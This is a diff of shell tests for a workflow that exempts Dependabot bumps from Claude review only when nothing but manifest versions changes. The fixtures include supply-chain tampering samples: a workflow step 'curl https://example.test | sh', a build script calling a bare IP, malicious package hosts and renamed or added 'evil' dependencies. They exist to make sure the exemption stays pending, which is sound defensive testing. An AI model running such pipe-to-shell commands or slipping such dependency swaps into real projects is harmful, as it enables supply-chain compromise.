@@ -717,3 +717,267 @@ assert_detect false "an ordinary PR" "$(pr_heads feat/x)"
 assert_detect false "a branch merely naming the prefix" "$(pr_heads "feat/${detect_prefix}x")"
 assert_detect false "a direct push with no PR" "$(pr_heads)"
 assert_detect error "an API failure" error
+
+# ── claude-review.yml's Dependabot exemption: posts a lens's status only for a
+# bump that changes Dependabot's manifests and nothing else.
+exempt_script="$(workflow_step_script .github/workflows/claude-review.yml "Exempt a Dependabot bump")"
+exempt_dir="$test_dir/exempt"
+exempt_bin="$exempt_dir/bin"
+mkdir -p "$exempt_bin"
+# shellcheck disable=SC2016 # The stub reads its fixtures when it runs.
+printf '%s\n' \
+    '#!/usr/bin/env bash' \
+    'set -euo pipefail' \
+    'args="$*"' \
+    'case "$args" in' \
+    '  *"/files"*) cat "$EXEMPT_FIXTURES/files.jsonl" ;;' \
+    '  *"/commits"*) cat "$EXEMPT_FIXTURES/commits.jsonl" ;;' \
+    '  *"/compare/"*) echo base123 ;;' \
+    '  *"/contents/"*) path="${args#*/contents/}"; path="${path%%\?*}"; ref="${args##*ref=}"; ref="${ref%% *}"; cat "$EXEMPT_FIXTURES/$ref/$path" ;;' \
+    '  *"--method POST"*"/statuses/"*) cat >>"$EXEMPT_FIXTURES/statuses.jsonl" ;;' \
+    '  *"/pulls/"*) echo "$EXEMPT_CURRENT_HEAD" ;;' \
+    '  *) echo "unexpected gh $args" >&2; exit 1 ;;' \
+    'esac' \
+    >"$exempt_bin/gh"
+chmod +x "$exempt_bin/gh"
+
+crate() { printf '[[package]]\nname = "%s"\nversion = "%s"\nsource = "%s"\n\n' "$1" "$2" "${3:-registry+https://github.com/rust-lang/crates.io-index}"; }
+exempt_case() {
+    local fixtures="$exempt_dir/$1"
+    rm -rf "$fixtures"
+    mkdir -p "$fixtures/base123" "$fixtures/head123"
+    : >"$fixtures/statuses.jsonl"
+    jq -cn '{author: "dependabot[bot]", committer: "web-flow", verified: true}' >"$fixtures/commits.jsonl"
+    printf '%s\n' "$fixtures"
+}
+run_exempt() {
+    local fixtures="$1" current_head="${2:-head123}"
+    PATH="$exempt_bin:$PATH" EXEMPT_FIXTURES="$fixtures" EXEMPT_CURRENT_HEAD="$current_head" \
+        GH_TOKEN=test-token REPOSITORY=owner/repo PR_NUMBER=42 HEAD_SHA=head123 BASE_SHA=main123 \
+        LENS=correctness RUN_URL=https://example.test/run \
+        bash -c "$exempt_script" >/dev/null 2>&1 || fail "the exemption exited non-zero on $3"
+}
+assert_exempt() {
+    local fixtures="$1" want="$2" label="$3"
+    local got
+    got="$(jq -sr 'map(select(.context == "claude-review/correctness")) | last | .state // "none"' "$fixtures/statuses.jsonl")"
+    [[ "$got" == "$want" ]] || fail "the exemption posted $got, not $want, on $label"
+}
+file_row() { jq -cn --arg f "$1" --arg s "${2:-modified}" --arg p "${3:-@@ -1 +1 @@}" '{filename: $f, status: $s, patch: $p}'; }
+
+f="$(exempt_case bump)"
+file_row Cargo.lock >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a version bump"
+assert_exempt "$f" success "a version bump"
+
+f="$(exempt_case new-crate)"
+file_row Cargo.lock >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+{
+    crate serde 1.0.2
+    crate evil 0.1.0
+} >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a new crate"
+assert_exempt "$f" pending "a new crate"
+
+f="$(exempt_case git-source)"
+file_row Cargo.lock >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 "git+https://example.test/serde" >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a non-crates.io source"
+assert_exempt "$f" pending "a non-crates.io source"
+
+f="$(exempt_case outside)"
+{
+    file_row Cargo.lock
+    file_row crates/pixtuoid/src/main.rs
+} >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a file outside the manifests"
+assert_exempt "$f" pending "a file outside the manifests"
+
+f="$(exempt_case removed)"
+file_row requirements-dev.txt removed >"$f/files.jsonl"
+run_exempt "$f" head123 "a removed manifest"
+assert_exempt "$f" pending "a removed manifest"
+
+f="$(exempt_case uses-pin)"
+file_row .github/workflows/ci.yml modified $'@@ -9 +9 @@\n-      - uses: actions/checkout@aaa # v6\n+      - uses: actions/checkout@bbb # v7' >"$f/files.jsonl"
+run_exempt "$f" head123 "a uses: pin"
+assert_exempt "$f" success "a uses: pin"
+
+f="$(exempt_case workflow-edit)"
+file_row .github/workflows/ci.yml modified $'@@ -9 +9,2 @@\n-      - uses: actions/checkout@aaa # v6\n+      - uses: actions/checkout@bbb # v7\n+        run: curl https://example.test | sh' >"$f/files.jsonl"
+run_exempt "$f" head123 "a workflow edit beyond a pin"
+assert_exempt "$f" pending "a workflow edit beyond a pin"
+
+f="$(exempt_case install-script)"
+file_row site/package-lock.json >"$f/files.jsonl"
+mkdir -p "$f/base123/site" "$f/head123/site"
+jq -n '{packages: {"": {}, "node_modules/a": {version: "1.0.0", resolved: "https://registry.npmjs.org/a/-/a-1.0.0.tgz"}}}' >"$f/base123/site/package-lock.json"
+jq -n '{packages: {"": {}, "node_modules/a": {version: "1.0.1", resolved: "https://registry.npmjs.org/a/-/a-1.0.1.tgz", hasInstallScript: true}}}' >"$f/head123/site/package-lock.json"
+run_exempt "$f" head123 "a new install script"
+assert_exempt "$f" pending "a new install script"
+
+f="$(exempt_case pushed-on)"
+file_row Cargo.lock >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
+jq -cn '{author: "someone", committer: "someone", verified: false}' >>"$f/commits.jsonl"
+run_exempt "$f" head123 "a commit pushed onto the branch"
+assert_exempt "$f" pending "a commit pushed onto the branch"
+
+f="$(exempt_case moved)"
+file_row Cargo.lock >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+crate serde 1.0.2 >"$f/head123/Cargo.lock"
+run_exempt "$f" newer456 "a head that moved"
+assert_exempt "$f" pending "a head that moved"
+
+# ── The reviewer's round: the heads this lens reviewed before this one, plus one.
+round_script="$(workflow_step_script .github/workflows/claude-readonly-review.yml "Count this lens's rounds")"
+round_dir="$test_dir/round"
+mkdir -p "$round_dir/bin" "$round_dir/work/.claude-review"
+# shellcheck disable=SC2016 # The stub reads its fixture when it runs.
+printf '%s\n' '#!/usr/bin/env bash' 'set -euo pipefail' '[[ "$*" == *"/issues/42/comments"* ]]' 'cat "$ROUND_COMMENTS"' >"$round_dir/bin/gh"
+chmod +x "$round_dir/bin/gh"
+comment() { jq -cn --arg u "$1" --arg b "$2" '{user: {login: $u}, body: $b}'; }
+jq -cs '[.[:2], .[2:]]' <(
+    comment "github-actions[bot]" $'## Claude design review\n\nHead: `a`'
+    comment "github-actions[bot]" $'## Claude correctness review\n\nHead: `a`'
+    comment "someone" $'## Claude design review\n\nquoted'
+    comment "github-actions[bot]" $'## Claude design review\n\nHead: `b`'
+    comment "github-actions[bot]" $'## Claude design review\n\nHead: `b`'
+) >"$round_dir/comments.json"
+assert_round() {
+    : >"$round_dir/work/.claude-review/review-context.md"
+    (cd "$round_dir/work" && PATH="$round_dir/bin:$PATH" ROUND_COMMENTS="$round_dir/comments.json" \
+        GH_TOKEN=t PR_NUMBER=42 REPOSITORY=owner/repo REVIEW_TITLE="Claude design review" HEAD_SHA="$1" \
+        bash -c "$round_script") || fail "the round count exited non-zero"
+    grep -qx "Round: $2" "$round_dir/work/.claude-review/review-context.md" ||
+        fail "the round count at head $1 wrote $(<"$round_dir/work/.claude-review/review-context.md"), not Round: $2 ($3)"
+}
+assert_round c 3 "two heads of this lens's, one reviewed twice, across pages"
+assert_round b 2 "a re-review of a head counts that head once"
+
+# A manifest outside the lockfiles may move version strings, nothing else.
+f="$(exempt_case owner-swap)"
+file_row .github/workflows/ci.yml modified $'@@ -9 +9 @@\n-      - uses: actions/checkout@aaa # v6\n+      - uses: someone-else/checkout@bbb # v7' >"$f/files.jsonl"
+run_exempt "$f" head123 "an action swapped for another"
+assert_exempt "$f" pending "an action swapped for another"
+
+f="$(exempt_case package-json-version)"
+file_row site/package.json modified $'@@ -9 +9 @@\n-    "astro": "^5.1.0",\n+    "astro": "^5.2.3",' >"$f/files.jsonl"
+run_exempt "$f" head123 "a package.json version bump"
+assert_exempt "$f" success "a package.json version bump"
+
+f="$(exempt_case package-json-dep)"
+file_row site/package.json modified $'@@ -9 +9,2 @@\n-    "astro": "^5.1.0",\n+    "astro": "^5.2.3",\n+    "evil": "^1.0.0",' >"$f/files.jsonl"
+run_exempt "$f" head123 "a package.json dependency the lock never saw"
+assert_exempt "$f" pending "a package.json dependency the lock never saw"
+
+f="$(exempt_case cargo-patch)"
+file_row Cargo.toml modified $'@@ -40 +40,2 @@\n-serde = "1.0.1"\n+serde = "1.0.2"\n+[patch.crates-io]' >"$f/files.jsonl"
+run_exempt "$f" head123 "a Cargo.toml edit beyond a version"
+assert_exempt "$f" pending "a Cargo.toml edit beyond a version"
+
+# The lockfile guards hold on a lock large enough to fill a pipe, with the
+# offending entry first, and refuse a lock they cannot read.
+big_crates() { for i in $(seq 1 2000); do crate "filler$i" 1.0.0; done; }
+f="$(exempt_case big-git-source)"
+file_row Cargo.lock >"$f/files.jsonl"
+{
+    crate serde 1.0.1
+    big_crates
+} >"$f/base123/Cargo.lock"
+{
+    crate serde 1.0.2 "git+https://example.test/serde"
+    big_crates
+} >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a git source ahead of a large lock"
+assert_exempt "$f" pending "a git source ahead of a large lock"
+
+npm_lock() { jq -n --arg host "$1" --argjson extra "${2:-false}" '{packages: ({"": {}, "node_modules/a": {version: "1.0.1", resolved: "\($host)/a/-/a-1.0.1.tgz"}}
+    + ([range(2000)] | map({key: "node_modules/f\(.)", value: {version: "1.0.0", resolved: "https://registry.npmjs.org/f/-/f-1.0.0.tgz"}}) | from_entries)
+    + (if $extra then {"node_modules/new": {version: "1.0.0", resolved: "https://registry.npmjs.org/new/-/new-1.0.0.tgz"}} else {} end))}'; }
+f="$(exempt_case npm-host)"
+file_row site/package-lock.json >"$f/files.jsonl"
+mkdir -p "$f/base123/site" "$f/head123/site"
+npm_lock https://registry.npmjs.org >"$f/base123/site/package-lock.json"
+npm_lock https://evil.example.test >"$f/head123/site/package-lock.json"
+run_exempt "$f" head123 "a package host ahead of a large lock"
+assert_exempt "$f" pending "a package host ahead of a large lock"
+
+f="$(exempt_case npm-new-package)"
+file_row site/package-lock.json >"$f/files.jsonl"
+mkdir -p "$f/base123/site" "$f/head123/site"
+npm_lock https://registry.npmjs.org >"$f/base123/site/package-lock.json"
+npm_lock https://registry.npmjs.org true >"$f/head123/site/package-lock.json"
+run_exempt "$f" head123 "a package new to the npm lock"
+assert_exempt "$f" pending "a package new to the npm lock"
+
+f="$(exempt_case npm-unreadable)"
+file_row site/package-lock.json >"$f/files.jsonl"
+mkdir -p "$f/base123/site" "$f/head123/site"
+npm_lock https://registry.npmjs.org >"$f/base123/site/package-lock.json"
+echo '{"lockfileVersion": 1, "dependencies": {}}' >"$f/head123/site/package-lock.json"
+run_exempt "$f" head123 "an npm lock with no packages map"
+assert_exempt "$f" pending "an npm lock with no packages map"
+
+f="$(exempt_case cargo-unreadable)"
+file_row Cargo.lock >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+echo 'not a lock' >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "an unreadable Cargo.lock"
+assert_exempt "$f" pending "an unreadable Cargo.lock"
+
+f="$(exempt_case newline-name)"
+file_row $'Cargo.toml\n' >"$f/files.jsonl"
+run_exempt "$f" head123 "a manifest name with a trailing newline"
+assert_exempt "$f" pending "a manifest name with a trailing newline"
+
+# The mask covers a whole version string and nothing else, in the order lines
+# appear; requirements-dev.txt bumps a pin; a Cargo.lock reads only as Cargo
+# writes it.
+f="$(exempt_case script-host)"
+file_row site/package.json modified $'@@ -9 +9 @@\n-    "build": "curl 10.0.0.1",\n+    "build": "curl 66.6.6.6",' >"$f/files.jsonl"
+run_exempt "$f" head123 "a script's host behind digits"
+assert_exempt "$f" pending "a script's host behind digits"
+
+f="$(exempt_case digit-rename)"
+file_row site/package.json modified $'@@ -9 +9 @@\n-    "left1pad": "^1.0.0",\n+    "left2pad": "^1.0.0",' >"$f/files.jsonl"
+run_exempt "$f" head123 "a dependency renamed across a digit"
+assert_exempt "$f" pending "a dependency renamed across a digit"
+
+f="$(exempt_case swapped-steps)"
+file_row .github/workflows/ci.yml modified $'@@ -9,2 +9,2 @@\n-      - uses: a/x@1\n-      - uses: b/y@1\n+      - uses: b/y@2\n+      - uses: a/x@2' >"$f/files.jsonl"
+run_exempt "$f" head123 "two steps' actions exchanged"
+assert_exempt "$f" pending "two steps' actions exchanged"
+
+f="$(exempt_case pip-bump)"
+file_row requirements-dev.txt modified $'@@ -1 +1 @@\n-pytest==8.1.0\n+pytest==8.2.0' >"$f/files.jsonl"
+run_exempt "$f" head123 "a requirements-dev.txt pin bump"
+assert_exempt "$f" success "a requirements-dev.txt pin bump"
+
+f="$(exempt_case pip-new)"
+file_row requirements-dev.txt modified $'@@ -1 +1,2 @@\n-pytest==8.1.0\n+pytest==8.2.0\n+evil==1.0.0' >"$f/files.jsonl"
+run_exempt "$f" head123 "a requirement new to requirements-dev.txt"
+assert_exempt "$f" pending "a requirement new to requirements-dev.txt"
+
+f="$(exempt_case cargo-noncanonical)"
+file_row Cargo.lock >"$f/files.jsonl"
+crate serde 1.0.1 >"$f/base123/Cargo.lock"
+{
+    crate serde 1.0.2
+    printf '[[package]]\nname="evil"\nversion = "0.1.0"\nsource="git+https://example.test/evil"\n'
+} >"$f/head123/Cargo.lock"
+run_exempt "$f" head123 "a Cargo.lock written by hand"
+assert_exempt "$f" pending "a Cargo.lock written by hand"
+
+f="$(exempt_case digit-led-rename)"
+file_row site/package.json modified $'@@ -9 +9 @@\n-    "v8-to-istanbul": "^9.1.0",\n+    "v8-evil": "^9.1.0",' >"$f/files.jsonl"
+run_exempt "$f" head123 "a digit-led dependency renamed"
+assert_exempt "$f" pending "a digit-led dependency renamed"
